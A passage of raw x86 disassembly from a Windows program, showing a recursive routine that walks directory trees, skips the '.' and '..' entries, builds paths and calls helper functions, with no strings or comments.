  402ca1:	be 68 52 41 00       	mov    $0x415268,%esi
  402ca6:	56                   	push   %esi
  402ca7:	8d 45 28             	lea    0x28(%ebp),%eax
  402caa:	50                   	push   %eax
  402cab:	56                   	push   %esi
  402cac:	68 c0 07 41 00       	push   $0x4107c0
  402cb1:	8d 85 4c fd ff ff    	lea    -0x2b4(%ebp),%eax
  402cb7:	50                   	push   %eax
  402cb8:	e8 5d cf 00 00       	call   0x40fc1a
  402cbd:	83 c4 0c             	add    $0xc,%esp
  402cc0:	50                   	push   %eax
  402cc1:	8d 85 3c fd ff ff    	lea    -0x2c4(%ebp),%eax
  402cc7:	50                   	push   %eax
  402cc8:	e8 47 cf 00 00       	call   0x40fc14
  402ccd:	83 c4 0c             	add    $0xc,%esp
  402cd0:	50                   	push   %eax
  402cd1:	8d 85 2c fd ff ff    	lea    -0x2d4(%ebp),%eax
  402cd7:	50                   	push   %eax
  402cd8:	e8 37 cf 00 00       	call   0x40fc14
  402cdd:	83 c4 0c             	add    $0xc,%esp
  402ce0:	50                   	push   %eax
  402ce1:	53                   	push   %ebx
  402ce2:	e8 2d cf 00 00       	call   0x40fc14
  402ce7:	83 c4 0c             	add    $0xc,%esp
  402cea:	e8 15 f8 ff ff       	call   0x402504
  402cef:	83 c4 14             	add    $0x14,%esp
  402cf2:	8b d8                	mov    %eax,%ebx
  402cf4:	43                   	inc    %ebx
  402cf5:	f7 db                	neg    %ebx
  402cf7:	1b db                	sbb    %ebx,%ebx
  402cf9:	43                   	inc    %ebx
  402cfa:	88 9d 60 fd ff ff    	mov    %bl,-0x2a0(%ebp)
  402d00:	8d 8d 2c fd ff ff    	lea    -0x2d4(%ebp),%ecx
  402d06:	ff 15 54 02 41 00    	call   *0x410254
  402d0c:	8d 8d 3c fd ff ff    	lea    -0x2c4(%ebp),%ecx
  402d12:	ff 15 54 02 41 00    	call   *0x410254
  402d18:	8d 8d 4c fd ff ff    	lea    -0x2b4(%ebp),%ecx
  402d1e:	ff 15 54 02 41 00    	call   *0x410254
  402d24:	84 db                	test   %bl,%bl
  402d26:	74 1b                	je     0x402d43
  402d28:	c7 85 28 fd ff ff 01 	movl   $0x1,-0x2d8(%ebp)
  402d2f:	00 00 00 
  402d32:	68 80 1a 41 00       	push   $0x411a80
  402d37:	8d 85 28 fd ff ff    	lea    -0x2d8(%ebp),%eax
  402d3d:	50                   	push   %eax
  402d3e:	e8 45 cf 00 00       	call   0x40fc88
  402d43:	ff 35 6c 03 41 00    	push   0x41036c
  402d49:	8d 4d 18             	lea    0x18(%ebp),%ecx
  402d4c:	ff 15 d0 02 41 00    	call   *0x4102d0
  402d52:	50                   	push   %eax
  402d53:	8d 4d 18             	lea    0x18(%ebp),%ecx
  402d56:	ff 15 cc 02 41 00    	call   *0x4102cc
  402d5c:	50                   	push   %eax
  402d5d:	8d 4d 18             	lea    0x18(%ebp),%ecx
  402d60:	ff 15 d0 02 41 00    	call   *0x4102d0
  402d66:	50                   	push   %eax
  402d67:	e8 da 08 00 00       	call   0x403646
  402d6c:	83 c4 10             	add    $0x10,%esp
  402d6f:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
  402d75:	50                   	push   %eax
  402d76:	68 bc 07 41 00       	push   $0x4107bc
  402d7b:	8d 45 08             	lea    0x8(%ebp),%eax
  402d7e:	50                   	push   %eax
  402d7f:	8d 85 18 fd ff ff    	lea    -0x2e8(%ebp),%eax
  402d85:	50                   	push   %eax
  402d86:	e8 b3 ce 00 00       	call   0x40fc3e
  402d8b:	83 c4 0c             	add    $0xc,%esp
  402d8e:	8b c8                	mov    %eax,%ecx
  402d90:	ff 15 c4 02 41 00    	call   *0x4102c4
  402d96:	50                   	push   %eax
  402d97:	ff 15 6c 01 41 00    	call   *0x41016c
  402d9d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402da0:	8d 8d 18 fd ff ff    	lea    -0x2e8(%ebp),%ecx
  402da6:	ff 15 c0 02 41 00    	call   *0x4102c0
  402dac:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  402db0:	75 3c                	jne    0x402dee
  402db2:	ff 37                	push   (%edi)
  402db4:	83 ec 10             	sub    $0x10,%esp
  402db7:	8b cc                	mov    %esp,%ecx
  402db9:	8d 85 10 fd ff ff    	lea    -0x2f0(%ebp),%eax
  402dbf:	50                   	push   %eax
  402dc0:	68 ac 07 41 00       	push   $0x4107ac
  402dc5:	ff 15 4c 02 41 00    	call   *0x41024c
  402dcb:	e8 34 f7 ff ff       	call   0x402504
  402dd0:	83 c4 14             	add    $0x14,%esp
  402dd3:	c7 85 0c fd ff ff 02 	movl   $0x2,-0x2f4(%ebp)
  402dda:	00 00 00 
  402ddd:	68 80 1a 41 00       	push   $0x411a80
  402de2:	8d 85 0c fd ff ff    	lea    -0x2f4(%ebp),%eax
  402de8:	50                   	push   %eax
  402de9:	e8 9a ce 00 00       	call   0x40fc88
  402dee:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
  402df4:	50                   	push   %eax
  402df5:	ff 75 ec             	push   -0x14(%ebp)
  402df8:	ff 15 70 01 41 00    	call   *0x410170
  402dfe:	85 c0                	test   %eax,%eax
  402e00:	0f 84 69 02 00 00    	je     0x40306f
  402e06:	f6 85 8c fd ff ff 10 	testb  $0x10,-0x274(%ebp)
  402e0d:	0f 84 e4 00 00 00    	je     0x402ef7
  402e13:	68 a8 07 41 00       	push   $0x4107a8
  402e18:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  402e1e:	50                   	push   %eax
  402e1f:	8b 1d 70 03 41 00    	mov    0x410370,%ebx
  402e25:	ff d3                	call   *%ebx
  402e27:	59                   	pop    %ecx
  402e28:	59                   	pop    %ecx
  402e29:	85 c0                	test   %eax,%eax
  402e2b:	0f 84 c6 00 00 00    	je     0x402ef7
  402e31:	68 a0 07 41 00       	push   $0x4107a0
  402e36:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  402e3c:	50                   	push   %eax
  402e3d:	ff d3                	call   *%ebx
  402e3f:	59                   	pop    %ecx
  402e40:	59                   	pop    %ecx
  402e41:	85 c0                	test   %eax,%eax
  402e43:	0f 84 ae 00 00 00    	je     0x402ef7
  402e49:	68 9c 07 41 00       	push   $0x41079c
  402e4e:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  402e54:	50                   	push   %eax
  402e55:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  402e5b:	50                   	push   %eax
  402e5c:	8d 8d fc fc ff ff    	lea    -0x304(%ebp),%ecx
  402e62:	ff 15 bc 02 41 00    	call   *0x4102bc
  402e68:	50                   	push   %eax
  402e69:	8d 45 08             	lea    0x8(%ebp),%eax
  402e6c:	50                   	push   %eax
  402e6d:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  402e73:	50                   	push   %eax
  402e74:	e8 bf cd 00 00       	call   0x40fc38
  402e79:	83 c4 0c             	add    $0xc,%esp
  402e7c:	50                   	push   %eax
  402e7d:	8d 85 6c fd ff ff    	lea    -0x294(%ebp),%eax
  402e83:	50                   	push   %eax
  402e84:	e8 b5 cd 00 00       	call   0x40fc3e
  402e89:	83 c4 0c             	add    $0xc,%esp
  402e8c:	8d 8d e8 fc ff ff    	lea    -0x318(%ebp),%ecx
  402e92:	ff 15 c0 02 41 00    	call   *0x4102c0
  402e98:	8d 8d fc fc ff ff    	lea    -0x304(%ebp),%ecx
  402e9e:	ff 15 c0 02 41 00    	call   *0x4102c0
  402ea4:	83 ec 10             	sub    $0x10,%esp
  402ea7:	8b cc                	mov    %esp,%ecx
  402ea9:	8d 45 18             	lea    0x18(%ebp),%eax
  402eac:	50                   	push   %eax
  402ead:	ff 15 b4 02 41 00    	call   *0x4102b4
  402eb3:	83 ec 10             	sub    $0x10,%esp
  402eb6:	8b cc                	mov    %esp,%ecx
  402eb8:	8d 85 6c fd ff ff    	lea    -0x294(%ebp),%eax
  402ebe:	50                   	push   %eax
  402ebf:	ff 15 b4 02 41 00    	call   *0x4102b4
  402ec5:	8b cf                	mov    %edi,%ecx
  402ec7:	e8 b7 02 00 00       	call   0x403183
  402ecc:	84 c0                	test   %al,%al
  402ece:	75 1b                	jne    0x402eeb
  402ed0:	c7 85 dc fc ff ff 03 	movl   $0x3,-0x324(%ebp)
  402ed7:	00 00 00 
  402eda:	68 80 1a 41 00       	push   $0x411a80
  402edf:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  402ee5:	50                   	push   %eax
  402ee6:	e8 9d cd 00 00       	call   0x40fc88
  402eeb:	8d 8d 6c fd ff ff    	lea    -0x294(%ebp),%ecx
  402ef1:	ff 15 c0 02 41 00    	call   *0x4102c0
  402ef7:	8d 85 d8 fc ff ff    	lea    -0x328(%ebp),%eax
  402efd:	50                   	push   %eax
  402efe:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  402f04:	50                   	push   %eax
  402f05:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  402f0b:	ff 15 bc 02 41 00    	call   *0x4102bc
  402f11:	ff 35 6c 03 41 00    	push   0x41036c
  402f17:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  402f1d:	ff 15 d0 02 41 00    	call   *0x4102d0
  402f23:	50                   	push   %eax
  402f24:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  402f2a:	ff 15 cc 02 41 00    	call   *0x4102cc
  402f30:	50                   	push   %eax
  402f31:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  402f37:	ff 15 d0 02 41 00    	call   *0x4102d0
  402f3d:	50                   	push   %eax
  402f3e:	e8 03 07 00 00       	call   0x403646
  402f43:	83 c4 10             	add    $0x10,%esp
  402f46:	6a 00                	push   $0x0
  402f48:	8d 45 18             	lea    0x18(%ebp),%eax
  402f4b:	50                   	push   %eax
  402f4c:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  402f52:	ff 15 b0 02 41 00    	call   *0x4102b0
  402f58:	8b 0d 9c 02 41 00    	mov    0x41029c,%ecx
  402f5e:	3b 01                	cmp    (%ecx),%eax
  402f60:	0f 84 f8 00 00 00    	je     0x40305e
  402f66:	8d 85 c4 fc ff ff    	lea    -0x33c(%ebp),%eax
  402f6c:	50                   	push   %eax
  402f6d:	68 50 02 00 00       	push   $0x250
  402f72:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
  402f78:	50                   	push   %eax
  402f79:	8d 8d c8 fc ff ff    	lea    -0x338(%ebp),%ecx
  402f7f:	ff 15 70 02 41 00    	call   *0x410270
  402f85:	50                   	push   %eax
  402f86:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  402f89:	ff 15 64 02 41 00    	call   *0x410264
  402f8f:	8d 8d c8 fc ff ff    	lea    -0x338(%ebp),%ecx
  402f95:	ff 15 54 02 41 00    	call   *0x410254
  402f9b:	ff 37                	push   (%edi)
  402f9d:	83 ec 10             	sub    $0x10,%esp
  402fa0:	8b dc                	mov    %esp,%ebx
  402fa2:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402fa5:	50                   	push   %eax
  402fa6:	56                   	push   %esi
  402fa7:	8d 45 08             	lea    0x8(%ebp),%eax
  402faa:	50                   	push   %eax
  402fab:	8d 85 ac fc ff ff    	lea    -0x354(%ebp),%eax
  402fb1:	50                   	push   %eax
  402fb2:	e8 1c be 00 00       	call   0x40edd3
  402fb7:	59                   	pop    %ecx
  402fb8:	59                   	pop    %ecx
  402fb9:	50                   	push   %eax
  402fba:	56                   	push   %esi
  402fbb:	68 90 07 41 00       	push   $0x410790
  402fc0:	8d 85 9c fc ff ff    	lea    -0x364(%ebp),%eax
  402fc6:	50                   	push   %eax
  402fc7:	e8 4e cc 00 00       	call   0x40fc1a
  402fcc:	83 c4 0c             	add    $0xc,%esp
  402fcf:	50                   	push   %eax
  402fd0:	8d 85 8c fc ff ff    	lea    -0x374(%ebp),%eax
  402fd6:	50                   	push   %eax
  402fd7:	e8 38 cc 00 00       	call   0x40fc14
  402fdc:	83 c4 0c             	add    $0xc,%esp
  402fdf:	50                   	push   %eax
  402fe0:	8d 85 7c fc ff ff    	lea    -0x384(%ebp),%eax
  402fe6:	50                   	push   %eax
  402fe7:	e8 28 cc 00 00       	call   0x40fc14
  402fec:	83 c4 0c             	add    $0xc,%esp
  402fef:	50                   	push   %eax
  402ff0:	53                   	push   %ebx
  402ff1:	e8 1e cc 00 00       	call   0x40fc14
  402ff6:	83 c4 0c             	add    $0xc,%esp
  402ff9:	e8 06 f5 ff ff       	call   0x402504
  402ffe:	83 c4 14             	add    $0x14,%esp
  403001:	8b d8                	mov    %eax,%ebx
  403003:	43                   	inc    %ebx
  403004:	f7 db                	neg    %ebx
  403006:	1b db                	sbb    %ebx,%ebx
  403008:	43                   	inc    %ebx
  403009:	88 9d c0 fc ff ff    	mov    %bl,-0x340(%ebp)
  40300f:	8d 8d 7c fc ff ff    	lea    -0x384(%ebp),%ecx
  403015:	ff 15 54 02 41 00    	call   *0x410254
  40301b:	8d 8d 8c fc ff ff    	lea    -0x374(%ebp),%ecx
  403021:	ff 15 54 02 41 00    	call   *0x410254
  403027:	8d 8d 9c fc ff ff    	lea    -0x364(%ebp),%ecx
  40302d:	ff 15 54 02 41 00    	call   *0x410254
  403033:	8d 8d ac fc ff ff    	lea    -0x354(%ebp),%ecx
  403039:	ff 15 54 02 41 00    	call   *0x410254
  40303f:	84 db                	test   %bl,%bl
  403041:	74 1b                	je     0x40305e
  403043:	c7 85 78 fc ff ff 04 	movl   $0x4,-0x388(%ebp)
  40304a:	00 00 00 
  40304d:	68 80 1a 41 00       	push   $0x411a80
  403052:	8d 85 78 fc ff ff    	lea    -0x388(%ebp),%eax
  403058:	50                   	push   %eax
  403059:	e8 2a cc 00 00       	call   0x40fc88
  40305e:	8d 8d 7c fd ff ff    	lea    -0x284(%ebp),%ecx
  403064:	ff 15 c0 02 41 00    	call   *0x4102c0
  40306a:	e9 7f fd ff ff       	jmp    0x402dee
  40306f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  403073:	ff 75 ec             	push   -0x14(%ebp)
  403076:	ff 15 74 01 41 00    	call   *0x410174
  40307c:	ff 37                	push   (%edi)
  40307e:	83 ec 10             	sub    $0x10,%esp
  403081:	8b fc                	mov    %esp,%edi
  403083:	8d 45 38             	lea    0x38(%ebp),%eax
  403086:	50                   	push   %eax
  403087:	56                   	push   %esi
  403088:	8d 45 28             	lea    0x28(%ebp),%eax
  40308b:	50                   	push   %eax
  40308c:	56                   	push   %esi
  40308d:	68 80 07 41 00       	push   $0x410780
  403092:	8d 85 64 fc ff ff    	lea    -0x39c(%ebp),%eax
  403098:	50                   	push   %eax
  403099:	e8 7c cb 00 00       	call   0x40fc1a
  40309e:	83 c4 0c             	add    $0xc,%esp
  4030a1:	50                   	push   %eax
  4030a2:	8d 85 54 fc ff ff    	lea    -0x3ac(%ebp),%eax
  4030a8:	50                   	push   %eax
  4030a9:	e8 66 cb 00 00       	call   0x40fc14
  4030ae:	83 c4 0c             	add    $0xc,%esp
  4030b1:	50                   	push   %eax
  4030b2:	8d 85 44 fc ff ff    	lea    -0x3bc(%ebp),%eax
  4030b8:	50                   	push   %eax
  4030b9:	e8 56 cb 00 00       	call   0x40fc14
  4030be:	83 c4 0c             	add    $0xc,%esp
  4030c1:	50                   	push   %eax
  4030c2:	57                   	push   %edi
  4030c3:	e8 4c cb 00 00       	call   0x40fc14
  4030c8:	83 c4 0c             	add    $0xc,%esp
  4030cb:	e8 34 f4 ff ff       	call   0x402504
  4030d0:	83 c4 14             	add    $0x14,%esp
  4030d3:	8d 8d 44 fc ff ff    	lea    -0x3bc(%ebp),%ecx
  4030d9:	ff 15 54 02 41 00    	call   *0x410254
  4030df:	8d 8d 54 fc ff ff    	lea    -0x3ac(%ebp),%ecx
  4030e5:	ff 15 54 02 41 00    	call   *0x410254
  4030eb:	8d 8d 64 fc ff ff    	lea    -0x39c(%ebp),%ecx
  4030f1:	ff 15 54 02 41 00    	call   *0x410254
  4030f7:	8d 4d 28             	lea    0x28(%ebp),%ecx
  4030fa:	ff 15 58 02 41 00    	call   *0x410258
  403100:	50                   	push   %eax
  403101:	ff 15 9c 03 41 00    	call   *0x41039c
  403107:	50                   	push   %eax
  403108:	e8 67 03 00 00       	call   0x403474
  40310d:	59                   	pop    %ecx
  40310e:	59                   	pop    %ecx
  40310f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403112:	ff 15 54 02 41 00    	call   *0x410254
  403118:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40311b:	ff 15 c0 02 41 00    	call   *0x4102c0
  403121:	8d 4d 18             	lea    0x18(%ebp),%ecx
  403124:	ff 15 c0 02 41 00    	call   *0x4102c0
  40312a:	8d 4d 28             	lea    0x28(%ebp),%ecx
  40312d:	ff 15 54 02 41 00    	call   *0x410254
  403133:	8d 4d 38             	lea    0x38(%ebp),%ecx
  403136:	ff 15 54 02 41 00    	call   *0x410254
  40313c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40313f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403146:	5f                   	pop    %edi
  403147:	5e                   	pop    %esi
  403148:	5b                   	pop    %ebx
  403149:	c9                   	leave
  40314a:	c2 40 00             	ret    $0x40
  40314d:	56                   	push   %esi
  40314e:	56                   	push   %esi
  40314f:	e8 34 cb 00 00       	call   0x40fc88
  403154:	8d 4d 28             	lea    0x28(%ebp),%ecx
  403157:	ff 15 58 02 41 00    	call   *0x410258
  40315d:	50                   	push   %eax
  40315e:	ff 15 9c 03 41 00    	call   *0x41039c
  403164:	50                   	push   %eax
  403165:	e8 0a 03 00 00       	call   0x403474
  40316a:	59                   	pop    %ecx
  40316b:	59                   	pop    %ecx
  40316c:	ff 75 ec             	push   -0x14(%ebp)
  40316f:	ff 15 74 01 41 00    	call   *0x410174
  403175:	6a 00                	push   $0x0
  403177:	ff 15 88 01 41 00    	call   *0x410188
  40317d:	b8 0f 31 40 00       	mov    $0x40310f,%eax
  403182:	c3                   	ret
  403183:	55                   	push   %ebp
  403184:	8b ec                	mov    %esp,%ebp
  403186:	81 ec fc 02 00 00    	sub    $0x2fc,%esp
  40318c:	53                   	push   %ebx
  40318d:	56                   	push   %esi
  40318e:	57                   	push   %edi
  40318f:	8b f9                	mov    %ecx,%edi
  403191:	8d 45 ff             	lea    -0x1(%ebp),%eax
  403194:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403197:	50                   	push   %eax
  403198:	ff 15 50 02 41 00    	call   *0x410250
  40319e:	ff 35 6c 03 41 00    	push   0x41036c
  4031a4:	8d 4d 18             	lea    0x18(%ebp),%ecx
  4031a7:	ff 15 d0 02 41 00    	call   *0x4102d0
  4031ad:	50                   	push   %eax
  4031ae:	8d 4d 18             	lea    0x18(%ebp),%ecx
  4031b1:	ff 15 cc 02 41 00    	call   *0x4102cc
  4031b7:	50                   	push   %eax
  4031b8:	8d 4d 18             	lea    0x18(%ebp),%ecx
  4031bb:	ff 15 d0 02 41 00    	call   *0x4102d0
  4031c1:	50                   	push   %eax
  4031c2:	e8 7f 04 00 00       	call   0x403646
  4031c7:	83 c4 10             	add    $0x10,%esp
  4031ca:	8d 85 04 fd ff ff    	lea    -0x2fc(%ebp),%eax
  4031d0:	50                   	push   %eax
  4031d1:	8d 45 08             	lea    0x8(%ebp),%eax
  4031d4:	68 bc 07 41 00       	push   $0x4107bc
  4031d9:	50                   	push   %eax
  4031da:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4031dd:	50                   	push   %eax
  4031de:	e8 5b ca 00 00       	call   0x40fc3e
  4031e3:	83 c4 0c             	add    $0xc,%esp
  4031e6:	8b c8                	mov    %eax,%ecx
  4031e8:	ff 15 c4 02 41 00    	call   *0x4102c4
  4031ee:	50                   	push   %eax
  4031ef:	ff 15 6c 01 41 00    	call   *0x41016c
  4031f5:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4031f8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4031fb:	ff 15 c0 02 41 00    	call   *0x4102c0
  403201:	83 7d f8 ff          	cmpl   $0xffffffff,-0x8(%ebp)
  403205:	0f 84 1d 02 00 00    	je     0x403428
  40320b:	8d 85 04 fd ff ff    	lea    -0x2fc(%ebp),%eax
  403211:	50                   	push   %eax
  403212:	ff 75 f8             	push   -0x8(%ebp)
  403215:	ff 15 70 01 41 00    	call   *0x410170
  40321b:	85 c0                	test   %eax,%eax
  40321d:	0f 84 fc 01 00 00    	je     0x40341f
  403223:	be 68 52 41 00       	mov    $0x415268,%esi
  403228:	f6 85 04 fd ff ff 10 	testb  $0x10,-0x2fc(%ebp)
  40322f:	0f 84 a6 00 00 00    	je     0x4032db
  403235:	8b 1d 70 03 41 00    	mov    0x410370,%ebx
  40323b:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  403241:	68 a8 07 41 00       	push   $0x4107a8
  403246:	50                   	push   %eax
  403247:	ff d3                	call   *%ebx
  403249:	59                   	pop    %ecx
  40324a:	85 c0                	test   %eax,%eax
  40324c:	59                   	pop    %ecx
  40324d:	0f 84 88 00 00 00    	je     0x4032db
  403253:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  403259:	68 a0 07 41 00       	push   $0x4107a0
  40325e:	50                   	push   %eax
  40325f:	ff d3                	call   *%ebx
  403261:	59                   	pop    %ecx
  403262:	85 c0                	test   %eax,%eax
  403264:	59                   	pop    %ecx
  403265:	74 74                	je     0x4032db
  403267:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40326a:	6a 5c                	push   $0x5c
  40326c:	50                   	push   %eax
  40326d:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  403273:	50                   	push   %eax
  403274:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  403277:	ff 15 bc 02 41 00    	call   *0x4102bc
  40327d:	50                   	push   %eax
  40327e:	8d 45 08             	lea    0x8(%ebp),%eax
  403281:	50                   	push   %eax
  403282:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  403285:	50                   	push   %eax
  403286:	e8 ad c9 00 00       	call   0x40fc38
  40328b:	83 c4 0c             	add    $0xc,%esp
  40328e:	50                   	push   %eax
  40328f:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  403292:	50                   	push   %eax
  403293:	e8 ac c9 00 00       	call   0x40fc44
  403298:	83 c4 0c             	add    $0xc,%esp
  40329b:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40329e:	ff 15 c0 02 41 00    	call   *0x4102c0
  4032a4:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  4032a7:	ff 15 c0 02 41 00    	call   *0x4102c0
  4032ad:	83 ec 10             	sub    $0x10,%esp
  4032b0:	8d 45 18             	lea    0x18(%ebp),%eax
  4032b3:	8b cc                	mov    %esp,%ecx
  4032b5:	50                   	push   %eax
  4032b6:	ff 15 b4 02 41 00    	call   *0x4102b4
  4032bc:	83 ec 10             	sub    $0x10,%esp
  4032bf:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4032c2:	8b cc                	mov    %esp,%ecx
  4032c4:	50                   	push   %eax
  4032c5:	ff 15 b4 02 41 00    	call   *0x4102b4
  4032cb:	8b cf                	mov    %edi,%ecx
  4032cd:	e8 b1 fe ff ff       	call   0x403183
  4032d2:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4032d5:	ff 15 c0 02 41 00    	call   *0x4102c0
  4032db:	8d 45 f6             	lea    -0xa(%ebp),%eax
  4032de:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4032e1:	50                   	push   %eax
  4032e2:	8d 85 30 fd ff ff    	lea    -0x2d0(%ebp),%eax
  4032e8:	50                   	push   %eax
  4032e9:	ff 15 bc 02 41 00    	call   *0x4102bc
  4032ef:	ff 35 6c 03 41 00    	push   0x41036c
  4032f5:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4032f8:	ff 15 d0 02 41 00    	call   *0x4102d0
  4032fe:	50                   	push   %eax
  4032ff:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403302:	ff 15 cc 02 41 00    	call   *0x4102cc
  403308:	50                   	push   %eax
  403309:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40330c:	ff 15 d0 02 41 00    	call   *0x4102d0
  403312:	50                   	push   %eax
  403313:	e8 2e 03 00 00       	call   0x403646
  403318:	83 c4 10             	add    $0x10,%esp
  40331b:	8d 45 18             	lea    0x18(%ebp),%eax
  40331e:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403321:	6a 00                	push   $0x0
  403323:	50                   	push   %eax
  403324:	ff 15 b0 02 41 00    	call   *0x4102b0
  40332a:	8b 0d 9c 02 41 00    	mov    0x41029c,%ecx
  403330:	3b 01                	cmp    (%ecx),%eax
  403332:	0f 84 c6 00 00 00    	je     0x4033fe
  403338:	8d 45 f7             	lea    -0x9(%ebp),%eax
  40333b:	8d 8d 54 ff ff ff    	lea    -0xac(%ebp),%ecx
  403341:	50                   	push   %eax
  403342:	8d 85 04 fd ff ff    	lea    -0x2fc(%ebp),%eax
  403348:	68 50 02 00 00       	push   $0x250
  40334d:	50                   	push   %eax
  40334e:	ff 15 70 02 41 00    	call   *0x410270
  403354:	50                   	push   %eax
  403355:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403358:	ff 15 64 02 41 00    	call   *0x410264
  40335e:	8d 8d 54 ff ff ff    	lea    -0xac(%ebp),%ecx
  403364:	ff 15 54 02 41 00    	call   *0x410254
  40336a:	ff 37                	push   (%edi)
  40336c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40336f:	83 ec 10             	sub    $0x10,%esp
  403372:	8b dc                	mov    %esp,%ebx
  403374:	50                   	push   %eax
  403375:	8d 45 08             	lea    0x8(%ebp),%eax
  403378:	56                   	push   %esi
  403379:	50                   	push   %eax
  40337a:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
  403380:	50                   	push   %eax
  403381:	e8 4d ba 00 00       	call   0x40edd3
  403386:	59                   	pop    %ecx
  403387:	59                   	pop    %ecx
  403388:	50                   	push   %eax
  403389:	56                   	push   %esi
  40338a:	8d 45 84             	lea    -0x7c(%ebp),%eax
  40338d:	68 90 07 41 00       	push   $0x410790
  403392:	50                   	push   %eax
  403393:	e8 82 c8 00 00       	call   0x40fc1a
  403398:	83 c4 0c             	add    $0xc,%esp
  40339b:	50                   	push   %eax
  40339c:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40339f:	50                   	push   %eax
  4033a0:	e8 6f c8 00 00       	call   0x40fc14
  4033a5:	83 c4 0c             	add    $0xc,%esp
  4033a8:	50                   	push   %eax
  4033a9:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  4033af:	50                   	push   %eax
  4033b0:	e8 5f c8 00 00       	call   0x40fc14
  4033b5:	83 c4 0c             	add    $0xc,%esp
  4033b8:	50                   	push   %eax
  4033b9:	53                   	push   %ebx
  4033ba:	e8 55 c8 00 00       	call   0x40fc14
  4033bf:	83 c4 0c             	add    $0xc,%esp
  4033c2:	e8 3d f1 ff ff       	call   0x402504
  4033c7:	83 c4 14             	add    $0x14,%esp
  4033ca:	83 f8 ff             	cmp    $0xffffffff,%eax
  4033cd:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  4033d3:	0f 94 c3             	sete   %bl
  4033d6:	ff 15 54 02 41 00    	call   *0x410254
  4033dc:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  4033df:	ff 15 54 02 41 00    	call   *0x410254
  4033e5:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  4033e8:	ff 15 54 02 41 00    	call   *0x410254
  4033ee:	8d 8d 64 ff ff ff    	lea    -0x9c(%ebp),%ecx
  4033f4:	ff 15 54 02 41 00    	call   *0x410254
  4033fa:	84 db                	test   %bl,%bl
  4033fc:	75 4e                	jne    0x40344c
  4033fe:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403401:	ff 15 c0 02 41 00    	call   *0x4102c0
  403407:	8d 85 04 fd ff ff    	lea    -0x2fc(%ebp),%eax
  40340d:	50                   	push   %eax
  40340e:	ff 75 f8             	push   -0x8(%ebp)
  403411:	ff 15 70 01 41 00    	call   *0x410170
  403417:	85 c0                	test   %eax,%eax
  403419:	0f 85 09 fe ff ff    	jne    0x403228
  40341f:	ff 75 f8             	push   -0x8(%ebp)
  403422:	ff 15 74 01 41 00    	call   *0x410174
  403428:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40342b:	ff 15 54 02 41 00    	call   *0x410254
  403431:	8d 4d 08             	lea    0x8(%ebp),%ecx
  403434:	ff 15 c0 02 41 00    	call   *0x4102c0
  40343a:	8d 4d 18             	lea    0x18(%ebp),%ecx
  40343d:	ff 15 c0 02 41 00    	call   *0x4102c0
  403443:	b0 01                	mov    $0x1,%al
  403445:	5f                   	pop    %edi
  403446:	5e                   	pop    %esi
  403447:	5b                   	pop    %ebx
  403448:	c9                   	leave
  403449:	c2 20 00             	ret    $0x20
  40344c:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40344f:	ff 15 c0 02 41 00    	call   *0x4102c0
  403455:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  403458:	ff 15 54 02 41 00    	call   *0x410254
  40345e:	8d 4d 08             	lea    0x8(%ebp),%ecx
  403461:	ff 15 c0 02 41 00    	call   *0x4102c0
  403467:	8d 4d 18             	lea    0x18(%ebp),%ecx
  40346a:	ff 15 c0 02 41 00    	call   *0x4102c0
  403470:	32 c0                	xor    %al,%al
  403472:	eb d1                	jmp    0x403445
